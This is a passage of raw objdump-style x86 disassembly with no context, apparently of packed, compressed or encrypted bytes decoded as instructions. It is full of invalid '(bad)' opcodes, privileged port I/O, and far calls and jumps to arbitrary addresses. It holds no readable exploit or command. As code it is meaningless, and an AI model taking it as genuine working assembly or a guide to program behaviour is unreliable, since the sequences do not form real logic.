  40b820:	scas   eax,DWORD PTR es:[edi]
  40b821:	ds cmp al,0x8a
  40b824:	rol    DWORD PTR [ebx-0x241eb272],cl
  40b82a:	sbb    ebp,esi
  40b82c:	push   0x5eed2449
  40b831:	xchg   edi,eax
  40b832:	and    ah,BYTE PTR [edi]
  40b834:	push   esp
  40b835:	repnz push ebp
  40b837:	(bad)  
  40b839:	out    0xec,al
  40b83b:	adc    eax,DWORD PTR [ebx+0x74]
  40b83e:	dec    esi
  40b83f:	mov    DWORD PTR [edi],edi
  40b841:	add    DWORD PTR [eax+ecx*1-0x40],esi
  40b845:	push   ebx
  40b846:	mov    cl,0xb3
  40b848:	push   eax
  40b849:	in     eax,dx
  40b84a:	(bad)  
  40b84b:	push   ss
  40b84c:	ret    0x230d
  40b84f:	pusha  
  40b850:	js     0x40b819
  40b852:	(bad)  
  40b853:	sub    ah,BYTE PTR [edx-0x772d2a13]
  40b859:	ins    BYTE PTR es:[edi],dx
  40b85a:	inc    esp
  40b85b:	sbb    BYTE PTR [edx],al
  40b85d:	inc    ebx
  40b85e:	out    dx,eax
  40b85f:	inc    edx
  40b860:	call   0xd111b38a
  40b865:	mov    edi,0x46440b48
  40b86a:	scas   eax,DWORD PTR es:[edi]
  40b86b:	inc    edx
  40b86c:	aad    0xb8
  40b86e:	add    BYTE PTR [ecx-0x79],dh
  40b871:	xchg   esp,eax
  40b872:	adc    eax,0x1d621e54
  40b877:	push   es
  40b878:	fs loopne 0x40b8d9
  40b87b:	ret    
  40b87c:	ret    0xa8cb
  40b87f:	daa    
  40b880:	(bad)  
  40b881:	mov    ds:0x4846d991,al
  40b886:	dec    ebp
  40b887:	mov    al,0xfe
  40b889:	adc    dh,cl
  40b88b:	cmp    al,0x4c
  40b88d:	call   0x7d9d:0xd6bb9c92
  40b894:	retf   0xd92d
  40b897:	sar    DWORD PTR [ebx+0x7d3ea0db],cl
  40b89d:	mov    edx,fs
  40b89f:	mov    cl,0x27
  40b8a1:	or     bh,BYTE PTR [edx-0x3a]
  40b8a4:	sub    ch,BYTE PTR [edx-0x43]
  40b8a7:	shl    BYTE PTR [edi+0x22],0x9b
  40b8ab:	add    ebx,DWORD PTR [ebx+0x6d]
  40b8ae:	iret   
  40b8af:	cmc    
  40b8b0:	mov    edx,0xff0bb4af
  40b8b5:	mov    ecx,0xf8fa16fa
  40b8ba:	cmp    ah,BYTE PTR [ebx+0x6d74a45b]
  40b8c0:	lds    eax,FWORD PTR [ebx-0x4]
  40b8c3:	das    
  40b8c4:	das    
  40b8c5:	test   DWORD PTR [eax+edx*1+0x56de5877],esp
  40b8cc:	repnz xchg ebp,eax
  40b8ce:	adc    edx,DWORD PTR [edx+0x36]
  40b8d1:	and    DWORD PTR [eax],eax
  40b8d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8d4:	repz scas eax,DWORD PTR es:[edi]
  40b8d6:	pop    eax
  40b8d7:	js     0x40b88e
  40b8d9:	xchg   ebp,eax
  40b8da:	gs pop ebx
  40b8dc:	cmp    bh,ah
  40b8de:	out    0xb6,eax
  40b8e0:	sbb    BYTE PTR [edx-0x4c],ah
  40b8e3:	inc    esi
  40b8e4:	jne    0x40b868
  40b8e6:	jmp    0x40b961
  40b8e8:	shl    BYTE PTR [ebx],1
  40b8ea:	outs   dx,BYTE PTR ds:[esi]
  40b8eb:	mov    dh,0xcb
  40b8ed:	pop    edx
  40b8ee:	adc    ebp,ecx
  40b8f0:	fist   WORD PTR [edx*4-0x5c319e8d]
  40b8f7:	jmp    0x40b8cd
  40b8f9:	call   0x55186a4d
  40b8fe:	call   0xa55a:0x6b95abf8
  40b905:	scas   al,BYTE PTR es:[di]
  40b907:	mov    al,0x43
  40b909:	mov    bl,0xcf
  40b90b:	out    dx,eax
  40b90c:	jns    0x40b8fb
  40b90e:	mov    ebp,0x6ed721cc
  40b913:	sbb    edi,ecx
  40b915:	pop    ebx
  40b916:	push   cs
  40b917:	xchg   esp,eax
  40b918:	push   es
  40b919:	sub    BYTE PTR [ebx+ebx*2],0x8f
  40b91d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b91e:	sbb    al,0x94
  40b920:	pop    edx
  40b921:	jno    0x40b930
  40b923:	sub    al,0x2b
  40b925:	out    dx,eax
  40b926:	cld    
  40b927:	pusha  
  40b928:	aad    0xb2
  40b92a:	adc    al,0xfb
  40b92c:	leave  
  40b92d:	add    edx,0x32
  40b930:	dec    edx
  40b931:	icebp  
  40b932:	jnp    0x40b951
  40b934:	add    bl,BYTE PTR [eax*1-0x5c96d4f1]
  40b93b:	and    al,0xc5
  40b93d:	bound  ebp,QWORD PTR [ebp+0x64]
  40b940:	popa   
  40b941:	jae    0x40b8e2
  40b943:	and    eax,0xddd927d
  40b948:	jmp    0x40b8f3
  40b94a:	inc    edx
  40b94b:	sahf   
  40b94c:	mov    esp,0x7288b566
  40b951:	push   ss
  40b952:	push   ebx
  40b953:	shl    ebp,0x60
  40b956:	inc    edi
  40b957:	add    bl,BYTE PTR [esi+eiz*4]
  40b95a:	aad    0x64
  40b95c:	ficom  DWORD PTR [ecx-0x564a4f1f]
  40b962:	add    edx,edx
  40b964:	dec    edx
  40b965:	mov    ah,0x4a
  40b967:	addr16 std 
  40b969:	ins    DWORD PTR es:[edi],dx
  40b96a:	inc    esp
  40b96b:	mov    dl,0xb9
  40b96d:	ss mov edx,0x211b50b7
  40b973:	std    
  40b974:	(bad)  
  40b975:	retf   0x52df
  40b978:	inc    ebx
  40b979:	xor    al,0xf8
  40b97b:	mov    edi,0x585462ef
  40b980:	cmp    al,0x4b
  40b982:	jmp    FWORD PTR [ebp-0x6988aa5d]
  40b988:	xor    ecx,esi
  40b98a:	pop    DWORD PTR [ebp+0x14bb6e20]
  40b990:	shr    dl,1
  40b992:	les    esi,FWORD PTR [eax+0xd26e4c7]
  40b998:	lods   eax,DWORD PTR ds:[esi]
  40b999:	std    
  40b99a:	xchg   esi,eax
  40b99b:	mov    dh,BYTE PTR [ecx+0x1de0c674]
  40b9a1:	push   ebx
  40b9a2:	inc    esi
  40b9a3:	adc    ebp,0xc
  40b9a6:	cmp    al,0x8a
  40b9a8:	aas    
  40b9a9:	push   esi
  40b9aa:	ror    DWORD PTR [ebx-0x21],1
  40b9ad:	popa   
  40b9ae:	rol    BYTE PTR fs:[ecx-0x1a0da88e],1
  40b9b5:	(bad)  
  40b9b6:	xchg   DWORD PTR [esi],edx
  40b9b8:	enter  0x312,0x80
  40b9bc:	loop   0x40ba22
  40b9be:	(bad)  
  40b9bf:	ins    BYTE PTR es:[edi],dx
  40b9c0:	fwait
  40b9c1:	in     al,dx
  40b9c2:	push   ecx
  40b9c3:	push   ebp
  40b9c4:	jbe    0x40ba30
  40b9c6:	out    0xd3,eax
  40b9c8:	mov    esp,cs
  40b9ca:	test   al,0xa
  40b9cc:	pop    ds
  40b9cd:	jge    0x40ba24
  40b9cf:	cmp    dh,BYTE PTR es:[ebx]
  40b9d2:	clc    
  40b9d3:	fs icebp 
  40b9d5:	sar    BYTE PTR [ebp-0x7656f6ff],0x5d
  40b9dc:	cdq    
  40b9dd:	adc    esp,DWORD PTR [ebp+0x77]
  40b9e0:	pop    esi
  40b9e1:	mov    ch,0x63
  40b9e3:	not    bl
  40b9e5:	pusha  
  40b9e6:	cdq    
  40b9e7:	jbe    0x40b9fa
  40b9e9:	cmp    al,0x4e
  40b9eb:	add    edi,edi
  40b9ed:	add    al,0x74
  40b9ef:	xor    eax,0xf81389e4
  40b9f4:	int3   
  40b9f5:	neg    DWORD PTR [ecx]
  40b9f7:	les    esp,FWORD PTR [ebx-0x53]
  40b9fa:	jmp    0xbc26:0xca8961a
  40ba01:	mov    dl,0xb
  40ba03:	mul    BYTE PTR [ecx+eiz*1+0x8]
  40ba07:	adc    dl,BYTE PTR [eax*2+0x301e44d9]
  40ba0e:	pop    ecx
  40ba0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba10:	and    ch,BYTE PTR [ebx+0x7c51980f]
  40ba16:	push   ecx
  40ba17:	jb     0x40ba1c
  40ba19:	lea    esp,[ebp+edi*4-0x2ecc5d49]
  40ba20:	mov    ah,0x23
  40ba22:	rcl    BYTE PTR ds:0x251df9a2,1
  40ba28:	mov    bl,0x48
  40ba2a:	xchg   BYTE PTR [esp+ebx*1+0xe7d7d3c],al
  40ba31:	push   edi
  40ba32:	lods   eax,DWORD PTR ds:[esi]
  40ba33:	dec    ecx
  40ba34:	sub    BYTE PTR [eax+0x73b1c97f],cl
  40ba3a:	xchg   BYTE PTR [ebx-0x30],cl
  40ba3d:	imul   ecx,eax,0x24
  40ba40:	mov    ah,0x1
  40ba42:	cmp    DWORD PTR [esp+ecx*1+0x33],esp
  40ba46:	jg     0x40ba74
  40ba48:	xchg   edi,eax
  40ba49:	mov    dl,0xa9
  40ba4b:	push   eax
  40ba4c:	mov    eax,0x327bfff8
  40ba51:	jp     0x40b9d6
  40ba53:	inc    ebp
  40ba54:	ja     0x40ba8c
  40ba56:	push   eax
  40ba57:	icebp  
  40ba58:	jnp    0x40baab
  40ba5a:	les    edx,FWORD PTR [ebp+0x1af96ddc]
  40ba60:	ret    
  40ba61:	test   eax,0x25d170aa
  40ba66:	test   BYTE PTR [edx-0x57b5c172],dh
  40ba6c:	mov    eax,0xa96a60a0
  40ba71:	daa    
  40ba72:	mov    cl,0x16
  40ba74:	in     eax,dx
  40ba75:	xchg   esi,eax
  40ba76:	jge    0x40ba7f
  40ba78:	sbb    BYTE PTR [esp+ecx*2+0x47109fdc],dl
  40ba7f:	sbb    al,0x1f
  40ba81:	dec    esp
  40ba82:	xchg   ebp,eax
  40ba83:	ficom  WORD PTR [esi+ebx*4-0x6f]
  40ba87:	aad    0xea
  40ba89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba8a:	int3   
  40ba8b:	inc    esp
  40ba8c:	cli    
  40ba8d:	hlt    
  40ba8e:	mov    BYTE PTR [ebp-0x1c],ah
  40ba91:	enter  0xfd93,0xd6
  40ba95:	push   cs
  40ba96:	inc    ebx
  40ba97:	cdq    
  40ba98:	mov    esp,esp
  40ba9a:	jmp    ebx
  40ba9c:	mov    esi,0x61c1c8f3
  40baa1:	xor    ecx,DWORD PTR [eax+0x14]
  40baa4:	xchg   bh,dh
  40baa6:	test   BYTE PTR [ebx],bl
  40baa8:	mov    ds:0x8970efe0,al
  40baad:	test   al,0xad
  40baaf:	sub    DWORD PTR ds:[edi+edi*8],esp
  40bab3:	sbb    DWORD PTR [ecx+0x44f79025],esi
  40bab9:	into   
  40baba:	cld    
  40babb:	aad    0x3
  40babd:	add    BYTE PTR [esi+ecx*4-0x68],bh
  40bac1:	sub    BYTE PTR [edx+0x52],al
  40bac4:	ja     0x40bb45
  40bac6:	push   eax
  40bac7:	sbb    bl,BYTE PTR [ebp-0x1b]
  40baca:	xor    eax,0xaa02a110
  40bacf:	sbb    BYTE PTR [ebx+eiz*2],dh
  40bad2:	aam    0x4b
  40bad4:	js     0x40ba81
  40bad6:	and    ebx,DWORD PTR [eax]
  40bad8:	push   ebx
  40bad9:	aas    
  40bada:	cmp    edi,edi
  40badc:	hlt    
  40badd:	lods   eax,DWORD PTR ds:[esi]
  40bade:	clc    
  40badf:	dec    edi
  40bae0:	cwde   
  40bae1:	neg    DWORD PTR [ebx+0x29d0c56e]
  40bae7:	jmp    0x8a413a41
  40baec:	loop   0x40bafd
  40baee:	mov    al,0xa3
  40baf0:	pslld  mm4,QWORD PTR [ebp+0x3a]
  40baf4:	pop    es
  40baf5:	fcmovnbe st,st(7)
  40baf7:	add    al,0x2
  40baf9:	push   eax
  40bafa:	mov    eax,0xd2f2e9cc
  40baff:	out    0xc1,eax
  40bb01:	and    eax,0x60c96b8a
  40bb06:	imul   eax,DWORD PTR [eax-0x65],0x1c34572
  40bb0d:	or     al,BYTE PTR [esi]
  40bb0f:	cs xchg ebp,eax
  40bb11:	mov    dh,0x3a
  40bb13:	xchg   edx,ebx
  40bb15:	push   es
  40bb16:	out    0xc,eax
  40bb18:	sub    eax,0xb3b793cb
  40bb1d:	xchg   edx,eax
  40bb1e:	cmp    al,0x3
  40bb20:	aaa    
  40bb21:	or     eax,DWORD PTR [edi-0x4c2b0eec]
  40bb27:	lods   al,BYTE PTR ds:[esi]
  40bb28:	xor    al,ah
  40bb2a:	js     0x40bad1
  40bb2c:	inc    edi
  40bb2d:	inc    ebp
  40bb2e:	int3   
  40bb2f:	imul   esi,DWORD PTR [eax],0xca1d34f2
  40bb35:	cmp    DWORD PTR ds:0xe63260c1,ebp
  40bb3b:	neg    BYTE PTR [ecx]
  40bb3d:	push   ebx
  40bb3e:	(bad)  
  40bb3f:	adc    bh,BYTE PTR [ebp-0x6e]
  40bb42:	add    eax,0xa8cfdbad
  40bb47:	or     bl,al
  40bb49:	xchg   BYTE PTR [esi],bl
  40bb4b:	mov    esi,0x49f006e9
  40bb50:	inc    esi
  40bb51:	repnz std 
  40bb53:	dec    esp
  40bb54:	js     0x40baeb
  40bb56:	les    esi,FWORD PTR [esi-0x39d6a2a0]
  40bb5c:	int3   
  40bb5d:	pop    es
  40bb5e:	bound  esi,QWORD PTR [edx]
  40bb60:	data16 (bad) 
  40bb62:	sti    
  40bb63:	repnz retf 
  40bb65:	mov    ah,0xa6
  40bb67:	and    DWORD PTR [ebx+0x25],0xf
  40bb6b:	sub    BYTE PTR cs:[eax],ah
  40bb6e:	xor    esp,DWORD PTR [edi+0xdb36c0a]
  40bb74:	ins    BYTE PTR es:[edi],dx
  40bb75:	ror    BYTE PTR [esi],cl
  40bb77:	in     eax,0x12
  40bb79:	add    BYTE PTR [eax+0x6],al
  40bb7c:	push   ebx
  40bb7d:	shr    edx,cl
  40bb7f:	sub    ebp,DWORD PTR [ebp-0x47289c4c]
  40bb85:	data16 std 
  40bb87:	dec    eax
  40bb88:	push   ebp
  40bb8a:	mov    ch,dh
  40bb8c:	pop    ds
  40bb8d:	mov    fs:0xba143889,al
  40bb93:	shr    DWORD PTR [ebp+0x35],0x9e
  40bb97:	jo     0x40bbe1
  40bb99:	add    BYTE PTR [edi],al
  40bb9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb9c:	loopne 0x40bb90
  40bb9e:	inc    edi
  40bb9f:	jo     0x40bb7f
  40bba1:	pop    esp
  40bba2:	outs   dx,DWORD PTR ds:[esi]
  40bba3:	dec    ecx
  40bba4:	addr16 xor al,0x75
  40bba7:	js     0x40bc06
  40bba9:	jle    0x40bbac
  40bbab:	xchg   edx,eax
  40bbac:	and    esp,DWORD PTR [ecx+0x59]
  40bbaf:	push   0xffffffbb
  40bbb1:	add    al,0x71
  40bbb3:	or     ebp,DWORD PTR [ecx+0x4]
  40bbb6:	les    esi,FWORD PTR [esi-0x3d]
  40bbb9:	hlt    
  40bbba:	mov    dh,0x50
  40bbbc:	inc    esp
  40bbbd:	out    0x53,eax
  40bbbf:	fisttp DWORD PTR [ebx]
  40bbc1:	in     al,dx
  40bbc2:	xchg   edi,eax
  40bbc3:	out    dx,eax
  40bbc4:	or     eax,0x78077557
  40bbc9:	aaa    
  40bbca:	push   edi
  40bbcb:	imul   eax,DWORD PTR [edx-0x2a057b67],0x8ab581a4
  40bbd5:	xchg   esp,eax
  40bbd6:	xchg   BYTE PTR [edi+esi*8+0x7c06f34],dl
  40bbdd:	xor    al,0x9f
  40bbdf:	test   eax,0x5b2e02c7
  40bbe4:	iret   
  40bbe5:	test   BYTE PTR ds:0xc9014c3c,0xaf
  40bbec:	inc    ebx
  40bbed:	or     ch,BYTE PTR [edx-0x64]
  40bbf0:	xchg   ecx,eax
  40bbf1:	lds    edx,FWORD PTR [edx-0x1eb86583]
  40bbf7:	dec    edi
  40bbf8:	(bad)  
  40bbf9:	pop    ss
  40bbfa:	in     eax,dx
  40bbfb:	stc    
  40bbfc:	mov    WORD PTR [ecx+0x1510fe72],ss
  40bc02:	dec    esi
  40bc03:	push   0x2b60d883
  40bc08:	out    dx,eax
  40bc09:	imul   ebx,DWORD PTR [esp+ebp*1+0x731c8e2a],0x66
  40bc11:	(bad)  
  40bc12:	pop    ds
  40bc13:	call   0xc65c:0x5df13024
  40bc1a:	lds    ebx,FWORD PTR [edx+0x5d]
  40bc1d:	fbld   TBYTE PTR [edi+eiz*4+0x4b]
  40bc21:	push   esi
  40bc22:	addr16 in eax,dx
  40bc24:	nop
  40bc25:	mov    al,0xdb
  40bc27:	mov    BYTE PTR [esi+0x1fd9f48b],dl
  40bc2d:	jns    0x40bbf3
  40bc2f:	mov    ds:0x9e7e4b4d,al
  40bc34:	or     ah,BYTE PTR [edx-0x6f]
  40bc37:	das    
  40bc38:	mov    eax,ds:0x4d6a5964
  40bc3d:	lea    ebp,[ecx-0x6a]
  40bc40:	bound  edx,QWORD PTR [eax-0x77]
  40bc43:	sbb    al,0x4b
  40bc45:	add    al,0xfa
  40bc47:	scas   al,BYTE PTR es:[edi]
  40bc48:	bound  esp,QWORD PTR [ebp-0x2]
  40bc4b:	jns    0x40bc48
  40bc4d:	xchg   esi,eax
  40bc4e:	repnz and BYTE PTR [eax+0x1c],al
  40bc52:	jne    0x40bbe6
  40bc54:	cmp    esp,DWORD PTR [ecx+0x7cc3712e]
  40bc5a:	icebp  
  40bc5b:	pop    eax
  40bc5c:	dec    eax
  40bc5d:	std    
  40bc5e:	rol    BYTE PTR [edi*2+0x73cc029d],cl
  40bc65:	cdq    
  40bc66:	push   esp
  40bc67:	push   ebp
  40bc68:	xchg   edx,eax
  40bc69:	je     0x40bc08
  40bc6b:	xchg   ebp,eax
  40bc6c:	mov    al,0xc0
  40bc6e:	mov    bh,0x9b
  40bc70:	cwde   
  40bc71:	mov    ds:0x66db2094,al
  40bc76:	ss daa 
  40bc78:	sub    eax,0x1bd5b219
  40bc7d:	jp     0x40bc1e
  40bc7f:	cld    
  40bc80:	frstpm(287 only) 
  40bc82:	test   al,0x46
  40bc84:	in     al,dx
  40bc85:	xor    eax,DWORD PTR [edx]
  40bc87:	sub    dh,BYTE PTR [eax+ebp*1-0x60]
  40bc8b:	aam    0xf3
  40bc8d:	sub    BYTE PTR [ebx],ch
  40bc8f:	popf   
  40bc90:	sahf   
  40bc91:	sub    BYTE PTR [ecx-0x68],bh
  40bc94:	push   es
  40bc95:	jle    0x40bc65
  40bc97:	repnz sbb eax,0x547366c5
  40bc9e:	mov    dl,BYTE PTR [ebx]
  40bca0:	dec    ebp
  40bca1:	les    ecx,FWORD PTR [edi-0x166fefaf]
  40bca7:	test   DWORD PTR [esi+ebp*4],0x3c265a58
  40bcae:	je     0x40bcc2
  40bcb0:	sar    DWORD PTR [eax],0xea
  40bcb3:	or     ah,BYTE PTR [edi]
  40bcb5:	scas   eax,DWORD PTR es:[edi]
  40bcb6:	pop    ss
  40bcb7:	out    0x41,eax
  40bcb9:	out    dx,ax
  40bcbb:	test   ecx,ebp
  40bcbd:	cwde   
  40bcbe:	(bad)  
  40bcbf:	clc    
  40bcc0:	add    bh,BYTE PTR [esi-0x6263a401]
  40bcc6:	and    cl,BYTE PTR [ebp+0x6868f9d8]
  40bccc:	mov    esi,0xec06b002
  40bcd1:	sbb    al,0x80
  40bcd3:	call   0xd2b7:0x6185ff86
  40bcda:	call   FWORD PTR [edx]
  40bcdc:	xchg   esi,eax
  40bcdd:	int3   
  40bcde:	inc    edx
  40bcdf:	mov    dh,0xfd
  40bce1:	dec    ebp
  40bce2:	(bad)  
  40bce3:	push   esp
  40bce4:	shl    edx,cl
  40bce6:	dec    esi
  40bce7:	clc    
  40bce8:	mov    eax,0x36dfabed
  40bced:	mov    eax,ds:0x6241ad65
  40bcf2:	ins    BYTE PTR es:[edi],dx
  40bcf3:	push   eax
  40bcf4:	retf   0xc987
  40bcf7:	loop   0x40bd15
  40bcf9:	sub    ebx,ebx
  40bcfb:	xchg   esp,eax
  40bcfc:	add    eax,0x971dacb7
  40bd01:	mov    eax,gs
  40bd03:	shl    BYTE PTR [edx],cl
  40bd05:	iret   
  40bd06:	ja     0x40bd5b
  40bd08:	push   DWORD PTR [ecx-0x48]
  40bd0b:	jecxz  0x40bd37
  40bd0d:	outs   dx,DWORD PTR ds:[esi]
  40bd0e:	lds    esp,FWORD PTR [ebx]
  40bd10:	sti    
  40bd11:	pop    edx
  40bd12:	inc    edx
  40bd13:	hlt    
  40bd14:	add    al,0x5a
  40bd16:	js     0x40bccc
  40bd18:	jmp    0x7fc05d96
  40bd1d:	out    0x1,eax
  40bd1f:	push   esp
  40bd20:	out    0x2d,al
  40bd22:	sub    eax,0x3b6b5c33
  40bd27:	outs   dx,BYTE PTR ds:[esi]
  40bd28:	xor    ebp,DWORD PTR [ebx+ebp*1+0x1af48e1d]
  40bd2f:	and    ebp,DWORD PTR [ecx-0x43fd6552]
  40bd35:	mov    al,ds:0x2433d176
  40bd3a:	cmp    ebx,edx
  40bd3c:	and    DWORD PTR [ecx+eiz*4+0x45],esi
  40bd40:	ins    DWORD PTR es:[edi],dx
  40bd41:	cmp    eax,0x2e44c8fc
  40bd46:	call   0x60db:0x51f93c91
  40bd4d:	add    al,0x7a
  40bd4f:	and    eax,0x2373e612
  40bd54:	dec    edx
  40bd55:	and    ecx,DWORD PTR [esi-0x435b2683]
  40bd5b:	or     al,0xb7
  40bd5d:	inc    ebp
  40bd5e:	jge    0x40bd9d
  40bd60:	int3   
  40bd61:	xchg   esp,eax
  40bd62:	or     DWORD PTR [ebx],0x76de335b
  40bd68:	mov    bl,0x99
  40bd6a:	hlt    
  40bd6b:	sub    ebx,DWORD PTR [esi-0x1d]
  40bd6e:	(bad)  
  40bd6f:	mov    ch,0xd
  40bd71:	mov    esp,DWORD PTR [ecx+0x5bb6a7cb]
  40bd77:	outs   dx,BYTE PTR ds:[esi]
  40bd78:	xchg   bl,dh
  40bd7a:	push   0x55
  40bd7c:	cmp    BYTE PTR [eax],bl
  40bd7e:	fidivr DWORD PTR [esi+0x3b583173]
  40bd84:	mov    ah,0x11
  40bd86:	or     eax,0xabdd588c
  40bd8b:	xor    eax,0xa0fc9cb1
  40bd90:	lock out dx,eax
  40bd92:	jle    0x40bd84
  40bd94:	push   ds
  40bd95:	jmp    DWORD PTR [ebp-0x6e]
  40bd98:	fnstsw WORD PTR [esi+0x2d]
  40bd9b:	scas   al,BYTE PTR es:[edi]
  40bd9c:	and    eax,0xcbfeb64d
  40bda1:	ret    0xa93
  40bda4:	call   0xebde:0x6a264a30
  40bdab:	lods   al,BYTE PTR ds:[esi]
  40bdac:	and    dh,dl
  40bdae:	push   edi
  40bdaf:	les    eax,FWORD PTR [esp+eax*1-0x666f481f]
  40bdb6:	cmp    BYTE PTR [ebx+0x12dc9254],dh
  40bdbc:	in     eax,0xbf
  40bdbe:	fs add al,0x9
  40bdc1:	add    esi,DWORD PTR [ecx-0x627ffb9c]
  40bdc7:	xchg   edi,eax
  40bdc8:	iret   
  40bdc9:	pusha  
  40bdca:	sub    DWORD PTR ds:0xb36f1a25,edx
  40bdd0:	pop    esi
  40bdd1:	dec    ebp
  40bdd2:	cmp    eax,0xbb8cf660
  40bdd7:	aad    0x7e
  40bdd9:	scas   eax,DWORD PTR es:[edi]
  40bdda:	sbb    dl,BYTE PTR [eax+edi*2]
  40bddd:	pop    ss
  40bdde:	das    
  40bddf:	pusha  
  40bde0:	fcmovnu st,st(6)
  40bde2:	cmc    
  40bde3:	std    
  40bde4:	jo     0x40bd6f
  40bde6:	sub    eax,0x1bf9daff
  40bdeb:	mov    WORD PTR [esi],gs
  40bded:	inc    eax
  40bdee:	add    eax,0xe21db8c0
  40bdf3:	push   ebx
  40bdf4:	dec    ecx
  40bdf5:	aam    0xaf
  40bdf7:	adc    al,0xc
  40bdf9:	(bad)  
  40bdfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdfb:	push   cs
  40bdfc:	(bad)  
  40bdfd:	lock push ebp
  40bdff:	sub    ch,BYTE PTR [ecx-0x11]
  40be02:	mov    edi,0x479f89b3
  40be07:	xor    eax,0xc0fef241
  40be0c:	sbb    ch,bl
  40be0e:	aam    0xe9
  40be10:	sub    eax,0x2db8d412
  40be15:	dec    sp
  40be17:	xor    cl,BYTE PTR [ecx+0x30268cff]
  40be1d:	pop    ecx
  40be1e:	call   0xed66b5f7
  40be23:	mov    bh,0x95
  40be25:	xchg   DWORD PTR [edx+eax*8-0x24],esp
  40be29:	data16 mov cl,0xcd
  40be2c:	adc    BYTE PTR [edi+0x5a2ce728],dl
  40be32:	mov    eax,0xfac182bd
  40be37:	push   ss
  40be38:	loop   0x40be14
  40be3a:	mov    eax,ds:0xe9101235
  40be3f:	push   ds
  40be40:	push   DWORD PTR [edx+0x644e7d4d]
  40be46:	mov    bl,0xfa
  40be48:	pop    ss
  40be49:	hlt    
  40be4a:	jge    0x40bdcd
  40be4c:	sub    eax,0xa2688902
  40be51:	push   ebx
  40be52:	std    
  40be53:	ds mov ebp,0xc7541af6
  40be59:	pop    ecx
  40be5a:	xor    al,0x3e
  40be5c:	pop    edi
  40be5d:	mov    WORD PTR [eax],es
  40be5f:	mov    dh,0xb9
  40be61:	dec    esp
  40be62:	pop    esp
  40be63:	inc    ecx
  40be64:	mov    ds:0x8b8aaa0d,al
  40be69:	retf   
  40be6a:	adc    dl,BYTE PTR [edi+0x45742b6a]
  40be70:	dec    ecx
  40be71:	inc    ebx
  40be72:	mov    dl,0xf9
  40be74:	(bad)  
  40be75:	jp     0x40bead
  40be77:	dec    eax
  40be78:	sub    al,0xdb
  40be7a:	cmp    al,0x58
  40be7c:	jmp    0x9465:0x101e1c21
  40be83:	xchg   edi,eax
  40be84:	cs fwait
  40be86:	leave  
  40be87:	sub    edi,DWORD PTR [edx]
  40be89:	loopne 0x40beea
  40be8b:	stos   DWORD PTR es:[edi],eax
  40be8c:	rol    BYTE PTR [ecx],1
  40be8e:	mov    dh,0xf5
  40be90:	iret   
  40be91:	xor    eax,0x7aec834a
  40be96:	adc    eax,0xf4942f38
  40be9b:	fstp   QWORD PTR [esi-0x77b9ffd4]
  40bea1:	sbb    edi,eax
  40bea3:	dec    ecx
  40bea4:	(bad)  
  40bea5:	out    dx,eax
  40bea6:	outs   dx,BYTE PTR ds:[esi]
  40bea7:	icebp  
  40bea8:	adc    al,0x69
  40beaa:	dec    edi
  40beab:	mov    ecx,0x5a291a
  40beb0:	nop
  40beb1:	jne    0x40be38
  40beb3:	addr16 jns 0x40be82
  40beb6:	mov    cl,0x5d
  40beb8:	mov    bl,0xc
  40beba:	fisub  DWORD PTR [eax-0x6203f1e5]
  40bec0:	ins    BYTE PTR es:[edi],dx
  40bec1:	das    
  40bec2:	(bad)  [edi]
  40bec4:	cmp    BYTE PTR [eax],cl
  40bec6:	in     eax,dx
  40bec7:	jbe    0x40be95
  40bec9:	js     0x40be91
  40becb:	push   edi
  40becc:	mov    eax,ds:0x75a15ea7
  40bed1:	(bad)  
  40bed2:	out    0x26,eax
  40bed4:	sub    al,0x5e
  40bed6:	in     eax,0xfc
  40bed8:	(bad)  [eax-0x7]
  40bedb:	mov    edx,0x98e0b29f
  40bee0:	pop    eax
  40bee1:	and    ah,dh
  40bee3:	jle    0x40be7f
  40bee5:	pop    esi
  40bee6:	scas   eax,DWORD PTR es:[edi]
  40bee7:	fnstsw WORD PTR [edi+0x6b]
  40beea:	or     al,0x9c
  40beec:	retf   0xc7dd
  40beef:	or     ah,BYTE PTR [esi+0x4dede124]
  40bef5:	adc    DWORD PTR [ebx+eax*2+0xe],edx
  40bef9:	jae    0x40bf1b
  40befb:	scas   al,BYTE PTR es:[edi]
  40befc:	fsub   QWORD PTR [eax]
  40befe:	add    edx,DWORD PTR [ebp+edx*1-0x38072b96]
  40bf05:	icebp  
  40bf06:	mov    bh,0xad
  40bf08:	clc    
  40bf09:	lods   eax,DWORD PTR ds:[esi]
  40bf0a:	or     DWORD PTR [ebx-0x62],ebx
  40bf0d:	mov    bl,0xd0
  40bf0f:	push   ecx
  40bf10:	add    DWORD PTR [eax-0x7b],ecx
  40bf13:	sub    eax,0xa5858654
  40bf18:	pusha  
  40bf19:	adc    bl,BYTE PTR [esi+0x32]
  40bf1c:	add    eax,0x40231814
  40bf21:	jo     0x40bf54
  40bf23:	pop    ds
  40bf24:	jmp    0x3fca89bd
  40bf29:	mov    ebx,0xe0052871
  40bf2e:	repnz cwde 
  40bf30:	and    eax,0xce936448
  40bf35:	inc    eax
  40bf36:	xchg   DWORD PTR [edx+0x33a13453],ecx
  40bf3c:	mov    es,WORD PTR [edi+0x5af6bd77]
  40bf42:	mov    ebx,0xa62ce975
  40bf47:	cmp    ebp,DWORD PTR [edi+edi*1+0x64]
  40bf4b:	sub    dh,al
  40bf4d:	(bad)  [edi+0x77]
  40bf50:	clc    
  40bf51:	mov    ecx,0xca6ae2d
  40bf56:	xor    dh,0xaf
  40bf59:	sbb    al,0x49
  40bf5b:	loope  0x40bee0
  40bf5d:	call   0x3c91:0x39afe825
  40bf64:	fldcw  WORD PTR ds:0x23bcc5c9
  40bf6a:	mov    edi,0x26e001ff
  40bf6f:	adc    eax,0x67082f39
  40bf74:	lods   al,BYTE PTR ds:[esi]
  40bf75:	dec    eax
  40bf76:	(bad)  
  40bf77:	jp     0x40bf9d
  40bf79:	xor    eax,DWORD PTR [ebx-0x1c]
  40bf7c:	jmp    0xa97d761d
  40bf81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf82:	sar    DWORD PTR [edx+0x31],0xe0
  40bf86:	shl    BYTE PTR [edi],cl
  40bf88:	push   ds
  40bf89:	pop    edi
  40bf8a:	sbb    eax,eax
  40bf8c:	or     BYTE PTR [ebp+0x1d2d8e98],bl
